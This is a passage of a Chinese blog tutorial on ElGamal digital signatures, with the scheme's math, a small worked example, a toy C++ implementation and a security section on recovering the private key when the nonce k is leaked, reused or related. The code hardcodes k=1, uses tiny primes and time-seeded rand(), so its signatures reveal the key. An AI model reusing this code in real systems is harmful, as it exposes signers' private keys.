产生消息摘要后,用自己的私钥对摘要进行加密,这个加密后的消息摘要就是数字签名，随后发送方 A 将消息与签名发给接收方 B。B 接收到消息及其签名后,用发送方 A 的公钥解密这个签名,获得由发送方 A 生成的消息摘要,接着用发送方 A 所用 Hash 算法重新生成所获得消息的摘要,然后比对这两个摘要。如果相同,说明这个签名是发送方 A 针对这个消息的有效签名;如果不相同,则签名无效。</p><p><img src="https://cdn.acwing.com/media/article/image/2023/11/18/169037_8532583f85-1.png" alt="1.png"></p><p>依据上述数字签名的基本原理,人们设计出了众多不同种类的数字签名方案,下面将介绍常用数字签名的实现方案。</p><h2 id="ElGamal-签名体制">ElGamal 签名体制</h2><p>T. EIGamal 于 1985 年提出了一个基于<strong>有限域离散对数问题</strong>的数字签名方案,美国 NIST 确立的数字签名标准(Digital Signature Standard,DSS)即是在它基础上修订的。EIGamal 数字签名方案是一种<strong>非确定性</strong>的签名方案,即对给定的一个消息,由于选择的随机数不同而产生不同的数字签名,并且验证算法均会判断为有效。下面简要介绍其方案的实现过程。</p><ol><li><p>密钥生成算法</p><p>选择一个满足安全性要求的大素数 p,然后选择一个<strong>生成元</strong> $g \in Z^<em>_p$;和随机数$x \in _RZ^</em>_p$，,计算$y \equiv g^x(mod\ p)$。则签名者 A 的公钥为(p，g，y),私钥为 x。</p></li><li><p>签名算法<br>设待签消息为 m，签名者选择随机数$k \in _RZ^*_p$;,计算:</p><p>$$<br>\begin{aligned}<br>&amp;r \equiv g^k(mod \ p) \newline<br>&amp;s \equiv [h(m)-xr]k^{-1}(mod \ (p-1))<br>\end{aligned}<br>$$</p><p>则对消息 m 的数字签名为(r，s),其中 h 为安全的 Hash 函数</p></li><li><p>验证算法</p><p>签名接收者 B 收到消息 m 和签名(r，s)后,首先计算 h(m),然后验证下列等式是否成立</p><p>$$<br>y^rr^s \equiv g^{h(m)}(mod \ p)<br>$$</p><p>如等式成立,则签名有效;否则,签名无效。</p></li><li><p>正确性</p><p>如果所有算法按步骤执行,则接收者输出签名有效,因为</p><p>$$<br>r \equiv g^k(mod \ p), s \equiv [h(m) - xr]k ^{-1}(mod \ (p - 1))<br>$$</p><p>所以</p><p>$$<br>\begin{aligned}<br>&amp; ks \equiv h(m) - xr(mod \ (p - 1)) \newline<br>&amp; g^{ks} \equiv g^{h(m) - xr}(mod \ p) \newline<br>&amp; g^{ks}g^{xr} \equiv g^{h(m)}(mod \ p) \newline<br>&amp; y^rr^s \equiv g^{h(m)}(mod \ p)<br>\end{aligned}<br>$$</p></li></ol><h2 id="案例">案例</h2><ol><li><p>密钥生成算法</p><p>假设 A 选取素数 p=19,$Z^*_p$的生成元 g=2。选取私钥 x=15,计算:</p><p>$$<br>y=g^x \ mod \ p=2^{15} \ mod \ 19 = 12<br>$$</p><p>则 A 的公钥是(p=19，g=2，y=12)。</p></li><li><p>签名算法<br>设消息 m 的 Hash 值 h(m)=16,则 A 选取随机数 k = 11，计算:</p><p>$$<br>\begin{aligned}<br>&amp;r=g^k \ mod \ p \equiv 2^{11} \ mod \ 19=15\newline<br>&amp;k^{-1} \ mod \ (p-1) = 5<br>\end{aligned}<br>$$</p><p>最后计算签名</p><p>$$<br>s=[h(m)-xr]k^{-1} \ mod \ (p-1)=5(16-15 \times 15) \ mod \ 18=17<br>$$</p><p>A 对 m 的签名为(15，17)。</p></li><li><p>验证算法</p><p>接收者 B 得到签名(15,17)后计算:</p><p>$$<br>\begin{aligned}<br>y^rr^s \ mod \ p=12^{15}15^{17} \ mod \ 19=5\newline<br>g^{h(m)} \ mod \ p \equiv 216 \ mod \ 19=5<br>\end{aligned}<br>$$</p><p>验证等式</p><p>$$<br>y^rr^s \equiv g^{h(m)}(mod \ p)<br>$$</p><p>成立，因此 B 接受签名。</p><p>注意,本例旨在说明该方案的实现过程,为计算方便所选参数均较为简单。按目前计算能力,通常使用 1024 比特或更大的模数。</p></li></ol><h2 id="C-代码">C++代码</h2><blockquote><p>在写代码的时候我并没有学习优先于离散对数问题~~（懒）~~，因此，关于生成元 g 的知识我并不清楚，我是直接 copy 的生成元函数，但是我会适当的加上我的理解的注释</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mod</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="keyword">while</span>(a&lt;<span class="number">0</span>)&#123;</span><br><span class="line">a=a+b;</span><br><span class="line">&#125;</span><br><span class="line">ans=a%b;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指数运算</span></span><br><span class="line"><span class="comment">// 输入a和b</span></span><br><span class="line"><span class="comment">// 输出a的b次方</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">power</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> temp = a;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span> ; i&lt;b ; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = temp * a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断一个数是否为素数</span></span><br><span class="line"><span class="comment">// 输入一个数a</span></span><br><span class="line"><span class="comment">// 返回：如果a是素数，返回true ； 否则返回false</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Prime</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span> ; i&lt;= (a/<span class="number">2</span>) ; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((a % i) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辗转相除法</span></span><br><span class="line"><span class="comment">// 输入 a 和 b</span></span><br><span class="line"><span class="comment">// 返回 a和b 的最大公约数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a , <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(b!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> temp = a % b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 欧拉函数</span></span><br><span class="line"><span class="comment">// 输入a</span></span><br><span class="line"><span class="comment">// 返回a的欧拉函数值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">euler</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span> ; i&lt;a ; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">gcd</span>(a,i) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">b += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求阶函数</span></span><br><span class="line"><span class="comment">// 作用是找到最小的正整数 p（p &lt; n），p % a == 0</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">order</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> n, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span>  p = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( p&lt;=n &amp;&amp; <span class="built_in">power</span>(b,p%a) != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">p += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p = p - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p &lt;= n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公钥p的生成函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Generate_p</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"><span class="type">int</span> p = (<span class="built_in">rand</span>() % (<span class="number">10000</span> - <span class="number">1000</span> + <span class="number">1</span>) + <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(; p&lt;<span class="number">10000</span> ; p++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Prime</span>(p)==<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 公钥g的生成函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Generate_g</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n = <span class="built_in">euler</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> a = <span class="number">2</span>; a&lt;p ; a++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">order</span>(p,n,a) == n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥x的生成函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Generate_x</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"><span class="type">int</span> d = <span class="built_in">rand</span>() % ( p<span class="number">-2</span><span class="number">-2</span>+<span class="number">1</span>) + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机数k的生成函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Generate_k</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"><span class="type">int</span> X = <span class="built_in">rand</span>() % p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> X;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 快速模幂运算</span></span><br><span class="line"><span class="comment">// 形式为 (a^b) mod c</span></span><br><span class="line"><span class="comment">// 输入 a 、b 和 c  因为要求a^b ， 因此是长整数</span></span><br><span class="line"><span class="comment">// 返回 (a^b) mod c 计算结果</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qmi</span><span class="params">(LL a, LL b, <span class="type">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(b &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b &amp; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            res = (res * a) % c;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        b = b &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        a = (a * a) % c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 求解乘法逆元</span></span><br><span class="line"><span class="comment">// 输入num 和 mod。 求num 在 mod 下的乘法逆元</span></span><br><span class="line"><span class="comment">// 返回num 在 mod 下的乘法逆元</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inverse</span><span class="params">(<span class="type">int</span> num,<span class="type">int</span> mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = num;</span><br><span class="line">    <span class="type">int</span> b = mod;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">1</span>, x0 = <span class="number">1</span>, y0 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> qt, temp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(b != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">qt = a / b;</span><br><span class="line">        temp = a % b;</span><br><span class="line"></span><br><span class="line">a = b;</span><br><span class="line">        b = temp;</span><br><span class="line"></span><br><span class="line">temp = x; x = x0 - qt * x; x0 = temp;</span><br><span class="line">        temp = y; y = y0 - qt * y; y0 = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(x0 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x0 += mod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;ElGamal签名验证开始O(∩_∩)O&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;=================================================&quot;</span> &lt;&lt;endl;</span><br><span class="line"><span class="comment">//ElGamal密钥生成</span></span><br><span class="line">cout &lt;&lt;<span class="string">&quot;1.ElGamal密钥生成如下:&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line"><span class="type">int</span> p = <span class="built_in">Generate_p</span>();</span><br><span class="line"><span class="type">int</span> g = <span class="built_in">Generate_g</span>(p);</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">Generate_x</span>(p);</span><br><span class="line"><span class="type">int</span> y = <span class="built_in">qmi</span>(g, x, p);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;随机数x为:&quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;签名者A的公钥&#123;p,g,y&#125;为:&#123;&quot;</span> &lt;&lt; p &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; g &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;=================================================&quot;</span> &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt;<span class="string">&quot;2.ElGamal签名开始:&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line"><span class="type">int</span> k = <span class="number">1</span>; <span class="comment">// 随机数</span></span><br><span class="line"><span class="type">int</span> in_k = <span class="built_in">inverse</span>(k, p - <span class="number">1</span>); <span class="comment">// k在mod(p-1)下的逆元</span></span><br><span class="line"><span class="type">int</span> hm = <span class="built_in">Generate_p</span>(); <span class="comment">// 随机一个明文</span></span><br><span class="line"><span class="type">int</span> r = <span class="built_in">qmi</span>(g, k, p);</span><br><span class="line"><span class="type">int</span> s = <span class="built_in">mod</span>((hm - x * r) * in_k , (p - <span class="number">1</span>));</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;明文hash后的值为&quot;</span> &lt;&lt; hm &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;随机数k和逆元in_k为:&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;,&quot;</span>&lt;&lt; in_k &lt;&lt;endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;A对消息的数字签名&#123;r,s&#125;为:&#123;&quot;</span> &lt;&lt; r &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;=================================================&quot;</span> &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;3.ElGamal验证开始:&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//防止计算过程中量太大，将算式拆分多次mod</span></span><br><span class="line">    <span class="comment">//y = 12,r = 15, p = 19, s = 17;</span></span><br><span class="line">    <span class="comment">//hm = 16,g = 2;</span></span><br><span class="line">    <span class="type">int</span> yr = <span class="built_in">qmi</span>(y, r, p);</span><br><span class="line">    <span class="type">int</span> rs = <span class="built_in">qmi</span>(r, s, p);</span><br><span class="line">    <span class="type">int</span> yrrs = <span class="built_in">mod</span>(yr *rs, p);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ghm = <span class="built_in">qmi</span>(g, hm, p);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;通过y,r,p计算yrrs mod p的值为:&quot;</span> &lt;&lt; yrrs &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;通过g,hm,p计算ghm mod p的值为:&quot;</span> &lt;&lt;ghm &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span>(yrrs == ghm) cout &lt;&lt; <span class="string">&quot;两值一致，数字签名验证有效!&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;两值不一致，数字签名验证无效!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ElGamal签名验证开始<span class="built_in">O</span>(∩_∩)O</span><br><span class="line">=================================================</span><br><span class="line"><span class="number">1.</span>ElGamal密钥生成如下:</span><br><span class="line"></span><br><span class="line">随机数x为:<span class="number">3998</span></span><br><span class="line">签名者A的公钥&#123;p,g,y&#125;为:&#123;<span class="number">4001</span>,<span class="number">2</span>,<span class="number">3001</span>&#125;</span><br><span class="line">=================================================</span><br><span class="line"><span class="number">2.</span>ElGamal签名开始:</span><br><span class="line"></span><br><span class="line">明文hash后的值为<span class="number">4001</span></span><br><span class="line">随机数k和逆元in_k为:<span class="number">1</span>,<span class="number">1</span></span><br><span class="line">A对消息的数字签名&#123;r,s&#125;为:&#123;<span class="number">2</span>,<span class="number">5</span>&#125;</span><br><span class="line">=================================================</span><br><span class="line"><span class="number">3.</span>ElGamal验证开始:</span><br><span class="line"></span><br><span class="line">通过y,r,p计算yrrs mod p的值为:<span class="number">2</span></span><br><span class="line">通过g,hm,p计算ghm mod p的值为:<span class="number">2</span></span><br><span class="line">两值一致，数字签名验证有效!</span><br></pre></td></tr></table></figure><h2 id="安全性">安全性</h2><p>使用 EIGamal 数字签名方案应注意以下安全问题:</p><ol><li><p>随机数 k 值的选取和保管</p><p>首先,k 值不能泄露。如果 k 值泄露,则容易计算$ x=[ h(m)-sk]r^{-1} \ mod \ (p-1$),签名者<br>的私钥泄露。</p><p>其次，随机数 k 不能重复使用。假设 k 用来对两个不同的消息签名，则 r 相同,即$(r,s_1)是m_1$的签名,$(r,s_2)是m_2$的签名。因为</p><p>$$<br>\begin{aligned}<br>s_1 \equiv [h(m_1)-xr]k^{-1} \ (mod \ (p-1))\newline<br>s_2 \equiv [ h(m_2)-xr]k^{-1} \ (mod \ (p-1))<br>\end{aligned}<br>$$</p><p>那么有</p><p>$$<br>(s_1-s_2)k \equiv [ h(m_1)-h(m_2)](mod \ (p-1))。<br>$$</p><p>又因为消息$m_1和m_2$不同,则$s_1-s_2 \neq 0 \ mod \ (p-1)$的概率很大,则</p><p>$$<br>k \equiv <a href="s_1-s_2"> h(m_1)-h(m_2)</a>^{-1}(mod \ (p-1))<br>$$</p><p>进而容易计算签名者的私钥 x。<br>最后，签名者多次签名时所选取多个 k 之间无关联。例如，三个不同的签名所选取的随机数为$ k_1、k_2、k_3$,满足条件$k_3= k_1+k_2$，显然有$r_3= r_1 r_2$,则:</p><p>由$s \equiv [h(m)-xr]k^{-1} \ (mod \ (p-1))$可得$h(m) \equiv (ks+xr)(mod \ (p-1))$</p><p>因此有:</p><p>$$<br>\begin{aligned}<br>h(m_1)=(xr_1+ k_1s_1)(mod \ (p-1)) \newline<br>h(m_2)=(xr_2+ k_2s_2)(mod \ (p-1)) \newline<br>h(m_3)=(xr_3+ k_3s_3)(mod \ (p-1))<br>\end{aligned}<br>$$</p><p>对以上三式分别乘以$s_2s_3,s_1s_3,s_1s_2<br>$ 得:</p><p>$$<br>\begin{align}<br>h(m_1)s_2s_3=(xr_1s_2s_3+ k_1s_1s_2s_3)(mod \ (p-1)) \newline<br>h(m_2)s_1s_3=(xr_2s_1s_3+ k_2s_1s_2s_3)(mod \ (p-1)) \newline<br>h(m_3)s_1s_2=(xr_3s_1s_2+ k_3s_1s_2s_3)(mod \ (p-1))<br>\end{align}<br>$$</p><p>计算式(1)+式(2)-式(3)得</p><p>$$<br>x\equiv<a href="r_1s_2s_3+r_2s_1s_3-r_3s_1s_2">h(m_1)s_2s_3+ h(m_2)s_1s_3- h(m_3)s_1s_2</a>^{-1}(mod \ (p-1))<br>$$</p><p>就可以从中推出签名者的私钥 x。<br>由此可见，随机数 k 的选取和保管对私钥 x 的保密性起着重要的作用。此外，随机数的使用也保证了签名方案的<strong>不可重用性</strong>，这是因为在不同时刻选取的随机数不同，即使对同一消息进行签名，也会产生不同的结果,因而避免了 RSA 签名出现的签名重用问题。</p></li><li><p>Hash 函数的应用<br>如果未使用 Hash 函数则签名方案容易受到攻击。例如攻击者可以选取任一整数对(u,v),满足 gcd(u,p-1)=1。计算$r=g^uy^v \ (mod \ p)，s \equiv -rv^{-1}(mod \ (p-1))和m 